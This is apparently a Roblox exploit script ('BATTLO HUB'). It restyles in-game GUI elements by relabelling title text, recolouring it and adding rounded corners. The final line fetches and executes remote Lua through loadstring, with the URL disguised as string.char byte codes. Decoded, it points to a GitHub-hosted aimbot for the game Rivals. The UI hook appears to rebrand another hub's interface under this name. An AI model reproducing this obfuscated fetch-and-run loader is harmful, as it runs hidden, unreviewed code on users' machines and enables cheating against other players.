
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "BATTLO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 110, 111, 110, 97, 109, 101, 109, 97, 110, 115, 100, 47, 114, 111, 98, 108, 111, 120, 115, 99, 114, 105, 112, 116, 115, 47, 109, 97, 105, 110, 47, 85, 80, 68, 95, 114, 105, 118, 97, 108, 115, 95, 45, 95, 65, 105, 109, 98, 111, 116, 95, 83, 116, 97, 99, 107, 95, 83, 111, 117, 114, 99, 101, 95, 52, 48, 51, 49, 49, 48, 49, 57, 46, 108, 117, 97)))()
